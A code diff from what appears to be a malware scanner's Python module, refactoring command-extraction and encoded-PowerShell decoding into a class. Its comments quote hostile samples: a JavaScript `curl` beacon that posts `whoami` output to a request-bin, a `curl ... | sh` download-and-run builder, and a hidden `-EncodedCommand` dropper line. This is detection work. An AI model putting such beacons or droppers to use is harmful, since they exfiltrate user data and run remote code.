@@ -105,64 +105,49 @@ class Command:
     line: int
 
 
-def extract(text: str, language: str | None = None) -> list[Command]:
-    """Command strings passed to spawn calls in this source.
+class EmbeddedCommands:
+    "Commands written inside source code, and the ones hidden by encoding."
 
-    Every string literal in a call's argument list is joined, because the
-    command is as often split across a sequence -- `spawn("sh", ["-c", "..."])`
-    -- as it is written whole.
+    @staticmethod
+    def extract(text: str, language: str | None = None) -> list[Command]:
+        """Command strings passed to spawn calls in this source.
 
-    Returns nothing for a language that does not invoke processes this way, so
-    a rule pack or a document containing the same text is not read as a call.
-    """
-    if language not in LANGUAGES:
-        return []
+        Every string literal in a call's argument list is joined, because the
+        command is as often split across a sequence -- `spawn("sh", ["-c", "..."])`
+        -- as it is written whole.
 
-    commands: list[Command] = []
+        Returns nothing for a language that does not invoke processes this way, so
+        a rule pack or a document containing the same text is not read as a call.
+        """
+        if language not in LANGUAGES:
+            return []
 
-    for call in _SPAWN_CALL.finditer(text):
-        if len(commands) >= MAX_COMMANDS:
-            break
+        commands: list[Command] = []
 
-        window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
-        arguments = window[: _close_paren(window)]
-        parts = _literals(arguments)
-        if not parts:
-            # The command may be a name rather than a literal. One line of
-            # indirection defeated all of this:
-            #
-            #     const command = `curl -X POST "https://.../$(whoami)/" ...`;
-            #     exec(command, (error, stdout, stderr) => { ... });
-            #
-            # That is `elf-stats-candystriped-muffin-773` and eight siblings
-            # published the same week, each a 391-byte beacon that posts the
-            # user and host name to a request-bin. Cordon reported NOTHING on
-            # them: the JavaScript rules see `exec` handed a variable, and the
-            # shell rules never run because the file is JavaScript, so the
-            # command was read by nobody.
-            parts = _assigned_literal(text, arguments, call.start())
-        if not parts:
-            continue
+        for call in _SPAWN_CALL.finditer(text):
+            if len(commands) >= MAX_COMMANDS:
+                break
 
-        commands.append(
-            Command(
-                text=" ".join(parts)[:MAX_COMMAND_CHARS],
-                line=text.count("\n", 0, call.start()) + 1,
-            )
-        )
+            window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
+            arguments = window[: EmbeddedCommands._close_paren(window)]
+            parts = EmbeddedCommands._literals(arguments)
+            if not parts:
+                # The command may be a name rather than a literal. One line of
+                # indirection defeated all of this:
+                #
+                #     const command = `curl -X POST "https://.../$(whoami)/" ...`;
+                #     exec(command, (error, stdout, stderr) => { ... });
+                #
+                # That is `elf-stats-candystriped-muffin-773` and eight siblings
+                # published the same week, each a 391-byte beacon that posts the
+                # user and host name to a request-bin. Cordon reported NOTHING on
+                # them: the JavaScript rules see `exec` handed a variable, and the
+                # shell rules never run because the file is JavaScript, so the
+                # command was read by nobody.
+                parts = EmbeddedCommands._assigned_literal(text, arguments, call.start())
+            if not parts:
+                continue
 
-    # Builders, where the command is assembled across a chain rather than passed to one call:
-    # Rust `Command::new("sh").arg("-c").arg("curl ... | sh")`, Go `exec.Command(...)`, Java
-    # `new ProcessBuilder(...)`, C# `Process.Start(...)`, Gradle `commandLine "sh", "-c", ...`.
-    # The literals up to the end of the statement are the command line. A Rust `build.rs` is
-    # an install hook, and this is how one runs a download.
-    for call in _BUILDER_CALL.finditer(text):
-        if len(commands) >= MAX_COMMANDS:
-            break
-        window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
-        ends = [i for i in (window.find(";"), window.find("\n\n"), window.find("\n}")) if i >= 0]
-        parts = _literals(window[: min(ends)] if ends else window)
-        if parts:
             commands.append(
                 Command(
                     text=" ".join(parts)[:MAX_COMMAND_CHARS],
@@ -170,17 +155,211 @@ def extract(text: str, language: str | None = None) -> list[Command]:
                 )
             )
 
-    # MSBuild: `<Exec Command="..." />`, the attribute value is the command line.
-    if language == "xml":
-        for task in _MSBUILD_EXEC.finditer(text):
+        # Builders, where the command is assembled across a chain rather than passed to one call:
+        # Rust `Command::new("sh").arg("-c").arg("curl ... | sh")`, Go `exec.Command(...)`, Java
+        # `new ProcessBuilder(...)`, C# `Process.Start(...)`, Gradle `commandLine "sh", "-c", ...`.
+        # The literals up to the end of the statement are the command line. A Rust `build.rs` is
+        # an install hook, and this is how one runs a download.
+        for call in _BUILDER_CALL.finditer(text):
             if len(commands) >= MAX_COMMANDS:
                 break
-            value = html.unescape(task.group(1))
-            commands.append(
-                Command(text=value[:MAX_COMMAND_CHARS], line=text.count("\n", 0, task.start()) + 1)
-            )
+            window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
+            ends = [
+                i for i in (window.find(";"), window.find("\n\n"), window.find("\n}")) if i >= 0
+            ]
+            parts = EmbeddedCommands._literals(window[: min(ends)] if ends else window)
+            if parts:
+                commands.append(
+                    Command(
+                        text=" ".join(parts)[:MAX_COMMAND_CHARS],
+                        line=text.count("\n", 0, call.start()) + 1,
+                    )
+                )
 
-    return commands
+        # MSBuild: `<Exec Command="..." />`, the attribute value is the command line.
+        if language == "xml":
+            for task in _MSBUILD_EXEC.finditer(text):
+                if len(commands) >= MAX_COMMANDS:
+                    break
+                value = html.unescape(task.group(1))
+                commands.append(
+                    Command(
+                        text=value[:MAX_COMMAND_CHARS], line=text.count("\n", 0, task.start()) + 1
+                    )
+                )
+
+        return commands
+
+    @staticmethod
+    def _assignment(name: str) -> re.Pattern[str]:
+        """`const NAME =`, `let NAME =`, `var NAME =`, or a bare `NAME =`."""
+        return re.compile(rf"(?:const|let|var)?[ \t]*\b{re.escape(name)}[ \t]*=[ \t]*")
+
+    @staticmethod
+    def _assigned_literal(text: str, arguments: str, call_start: int) -> list[str]:
+        """The literal assigned to the name a spawn call was handed, if there is one.
+
+        Only backwards, and only within this file: the value has to be established
+        before the call to be the value the call receives, and a name assigned
+        afterwards is a different binding or a later one. Only the LAST assignment
+        before the call is read, for the same reason.
+
+        Nothing clever about scope or reassignment is attempted. This resolves the
+        one shape that actually hides commands -- a string built once and passed by
+        name -- and returns nothing when it cannot be sure.
+        """
+        named = _NAME.match(arguments)
+        if named is None:
+            return []
+        before = text[:call_start]
+        last = None
+        for assignment in EmbeddedCommands._assignment(named.group(1)).finditer(before):
+            last = assignment
+        if last is None:
+            return []
+        return EmbeddedCommands._literals(before[last.end() : last.end() + _ARGUMENT_WINDOW])
+
+    @staticmethod
+    def _literals(window: str) -> list[str]:
+        """String literals in a call's arguments.
+
+        Scanned character by character rather than matched with a pattern. A
+        literal that honours escapes needs an alternation inside a repetition to
+        express as a regex, and Cordon refuses that shape in rule packs because of
+        how it backtracks; the engine does not get an exemption from a rule the
+        packs are held to. Scanning is also the clearer way to say it, and is
+        linear by construction.
+        """
+        parts: list[str] = []
+        index = 0
+        length = len(window)
+
+        while index < length:
+            quote = window[index]
+            if quote not in _QUOTES:
+                index += 1
+                continue
+
+            index += 1
+            start = index
+            while index < length and window[index] != quote:
+                # An escape consumes the character after it, so an escaped quote
+                # does not end the literal.
+                index += 2 if window[index] == "\\" else 1
+
+            parts.append(window[start : min(index, start + MAX_LITERAL_CHARS)])
+
+            if index >= length:
+                # The window ended mid-literal. What was read is still kept: a
+                # command long enough to run past the window is exactly the kind
+                # worth matching, and discarding it would report clean on content
+                # that was truncated rather than examined.
+                break
+
+            index += 1
+
+        return parts
+
+    @staticmethod
+    def _close_paren(window: str) -> int:
+        """Where the call's argument list ends, or the end of the window.
+
+        Counted rather than matched with a pattern, since balancing parentheses is
+        not something a regular expression does and a nested call in the arguments
+        is ordinary.
+        """
+        depth = 1
+        for index, character in enumerate(window):
+            if character == "(":
+                depth += 1
+            elif character == ")":
+                depth -= 1
+                if depth == 0:
+                    return index
+        return len(window)
+
+    @staticmethod
+    def decode_encoded_commands(commands: list[Command]) -> list[Command]:
+        """The commands, plus the plaintext of any encoded command among them.
+
+        Appended rather than substituted. The encoded form is evidence in itself --
+        the shell pack matches `-enc` as an execute, and a switch whose purpose is to
+        keep a command out of a log is worth reporting whether or not it decodes --
+        so both are handed on and the rules see each.
+
+        PowerShell encodes UTF-16LE, which is what the switch is specified to take.
+        UTF-8 is tried second because the shape gets copied into other contexts by
+        people who did not read the specification, and a payload that decodes either
+        way should be read either way.
+        """
+        out = list(commands)
+        for command in commands:
+            if len(out) >= MAX_COMMANDS * 2:
+                break
+            for match in ENCODED_COMMAND.finditer(command.text):
+                plain = EmbeddedCommands._decode_blob(match.group(1))
+                if plain:
+                    out.append(Command(text=plain[:MAX_COMMAND_CHARS], line=command.line))
+        return out
+
+    @staticmethod
+    def encoded_commands_in(text: str) -> list[Command]:
+        """The plaintext of every encoded command written in this source.
+
+        `decode_encoded_commands` reads what a spawn call was HANDED, which is the
+        right seam for `os.system("powershell -enc <blob>")` in a `setup.py`. A
+        `.ps1` that runs the same thing at its top level hands it to nobody: the
+        file is the script, `extract` finds no call site, and the plaintext was
+        read by nothing.
+
+        What that cost: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
+        <blob>` in a `.ps1` produced no finding at all. The switch was an `execute`
+        label with no partner -- the fetch, the URL and the `IEX` were all inside
+        the blob -- so the most-copied dropper one-liner in the literature scanned
+        clean.
+        """
+        out: list[Command] = []
+        for match in ENCODED_COMMAND.finditer(text):
+            if len(out) >= MAX_COMMANDS:
+                break
+            plain = EmbeddedCommands._decode_blob(match.group(1))
+            if plain:
+                out.append(
+                    Command(
+                        text=plain[:MAX_COMMAND_CHARS],
+                        line=text.count("\n", 0, match.start()) + 1,
+                    )
+                )
+        return out
+
+    @staticmethod
+    def _decode_blob(blob: str) -> str:
+        """The blob's plaintext, or an empty string if it does not read as text.
+
+        Base64 that decodes to bytes nobody would call a command is not treated as a
+        command. What is being asked is whether the author hid a program here, and a
+        run of control characters answers no.
+        """
+        import base64
+        import binascii
+
+        if len(blob) > MAX_ENCODED_BLOB:
+            return ""
+        try:
+            raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
+        except (binascii.Error, ValueError):
+            return ""
+        for encoding in ("utf-16-le", "utf-8"):
+            try:
+                text = raw.decode(encoding)
+            except (UnicodeDecodeError, LookupError):
+                continue
+            printable = sum(
+                1 for character in text if character.isprintable() or character in "\t\n\r"
+            )
+            if text and printable / len(text) > 0.9:
+                return text
+        return ""
 
 
 _BUILDER_CALL = re.compile(
@@ -194,95 +373,7 @@ _NAME = re.compile(r"^[ \t]*([A-Za-z_$][\w$]{0,64})[ \t]*[,)]")
 """A bare identifier as the first argument: `exec(command, ...)`."""
 
 
-def _assignment(name: str) -> re.Pattern[str]:
-    """`const NAME =`, `let NAME =`, `var NAME =`, or a bare `NAME =`."""
-    return re.compile(rf"(?:const|let|var)?[ \t]*\b{re.escape(name)}[ \t]*=[ \t]*")
-
-
-def _assigned_literal(text: str, arguments: str, call_start: int) -> list[str]:
-    """The literal assigned to the name a spawn call was handed, if there is one.
-
-    Only backwards, and only within this file: the value has to be established
-    before the call to be the value the call receives, and a name assigned
-    afterwards is a different binding or a later one. Only the LAST assignment
-    before the call is read, for the same reason.
-
-    Nothing clever about scope or reassignment is attempted. This resolves the
-    one shape that actually hides commands -- a string built once and passed by
-    name -- and returns nothing when it cannot be sure.
-    """
-    named = _NAME.match(arguments)
-    if named is None:
-        return []
-    before = text[:call_start]
-    last = None
-    for assignment in _assignment(named.group(1)).finditer(before):
-        last = assignment
-    if last is None:
-        return []
-    return _literals(before[last.end() : last.end() + _ARGUMENT_WINDOW])
-
-
-def _literals(window: str) -> list[str]:
-    """String literals in a call's arguments.
-
-    Scanned character by character rather than matched with a pattern. A
-    literal that honours escapes needs an alternation inside a repetition to
-    express as a regex, and Cordon refuses that shape in rule packs because of
-    how it backtracks; the engine does not get an exemption from a rule the
-    packs are held to. Scanning is also the clearer way to say it, and is
-    linear by construction.
-    """
-    parts: list[str] = []
-    index = 0
-    length = len(window)
-
-    while index < length:
-        quote = window[index]
-        if quote not in _QUOTES:
-            index += 1
-            continue
-
-        index += 1
-        start = index
-        while index < length and window[index] != quote:
-            # An escape consumes the character after it, so an escaped quote
-            # does not end the literal.
-            index += 2 if window[index] == "\\" else 1
-
-        parts.append(window[start : min(index, start + MAX_LITERAL_CHARS)])
-
-        if index >= length:
-            # The window ended mid-literal. What was read is still kept: a
-            # command long enough to run past the window is exactly the kind
-            # worth matching, and discarding it would report clean on content
-            # that was truncated rather than examined.
-            break
-
-        index += 1
-
-    return parts
-
-
-def _close_paren(window: str) -> int:
-    """Where the call's argument list ends, or the end of the window.
-
-    Counted rather than matched with a pattern, since balancing parentheses is
-    not something a regular expression does and a nested call in the arguments
-    is ordinary.
-    """
-    depth = 1
-    for index, character in enumerate(window):
-        if character == "(":
-            depth += 1
-        elif character == ")":
-            depth -= 1
-            if depth == 0:
-                return index
-    return len(window)
-
-
-__all__ = ["LANGUAGES", "MAX_COMMANDS", "MAX_COMMAND_CHARS", "Command", "extract"]
+__all__ = ["LANGUAGES", "MAX_COMMANDS", "MAX_COMMAND_CHARS", "Command", "EmbeddedCommands"]
 
 
 ENCODED_COMMAND = re.compile(
@@ -323,90 +414,9 @@ MAX_ENCODED_BLOB = 8192
 turning one pattern match into megabytes of work."""
 
 
-def decode_encoded_commands(commands: list[Command]) -> list[Command]:
-    """The commands, plus the plaintext of any encoded command among them.
-
-    Appended rather than substituted. The encoded form is evidence in itself --
-    the shell pack matches `-enc` as an execute, and a switch whose purpose is to
-    keep a command out of a log is worth reporting whether or not it decodes --
-    so both are handed on and the rules see each.
-
-    PowerShell encodes UTF-16LE, which is what the switch is specified to take.
-    UTF-8 is tried second because the shape gets copied into other contexts by
-    people who did not read the specification, and a payload that decodes either
-    way should be read either way.
-    """
-    out = list(commands)
-    for command in commands:
-        if len(out) >= MAX_COMMANDS * 2:
-            break
-        for match in ENCODED_COMMAND.finditer(command.text):
-            plain = _decode_blob(match.group(1))
-            if plain:
-                out.append(Command(text=plain[:MAX_COMMAND_CHARS], line=command.line))
-    return out
-
-
 SCRIPT_LANGUAGES = frozenset({"shell", "powershell"})
 """Languages where the file itself is the command line.
 
 Deliberately not `LANGUAGES`, which is the opposite question: those are
 languages that *call* a process, where a command exists as a string handed to
 something. Here there is no call site, because the file is what runs."""
-
-
-def encoded_commands_in(text: str) -> list[Command]:
-    """The plaintext of every encoded command written in this source.
-
-    `decode_encoded_commands` reads what a spawn call was HANDED, which is the
-    right seam for `os.system("powershell -enc <blob>")` in a `setup.py`. A
-    `.ps1` that runs the same thing at its top level hands it to nobody: the
-    file is the script, `extract` finds no call site, and the plaintext was
-    read by nothing.
-
-    What that cost: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
-    <blob>` in a `.ps1` produced no finding at all. The switch was an `execute`
-    label with no partner -- the fetch, the URL and the `IEX` were all inside
-    the blob -- so the most-copied dropper one-liner in the literature scanned
-    clean.
-    """
-    out: list[Command] = []
-    for match in ENCODED_COMMAND.finditer(text):
-        if len(out) >= MAX_COMMANDS:
-            break
-        plain = _decode_blob(match.group(1))
-        if plain:
-            out.append(
-                Command(
-                    text=plain[:MAX_COMMAND_CHARS],
-                    line=text.count("\n", 0, match.start()) + 1,
-                )
-            )
-    return out
-
-
-def _decode_blob(blob: str) -> str:
-    """The blob's plaintext, or an empty string if it does not read as text.
-
-    Base64 that decodes to bytes nobody would call a command is not treated as a
-    command. What is being asked is whether the author hid a program here, and a
-    run of control characters answers no.
-    """
-    import base64
-    import binascii
-
-    if len(blob) > MAX_ENCODED_BLOB:
-        return ""
-    try:
-        raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
-    except (binascii.Error, ValueError):
-        return ""
-    for encoding in ("utf-16-le", "utf-8"):
-        try:
-            text = raw.decode(encoding)
-        except (UnicodeDecodeError, LookupError):
-            continue
-        printable = sum(1 for character in text if character.isprintable() or character in "\t\n\r")
-        if text and printable / len(text) > 0.9:
-            return text
-    return ""
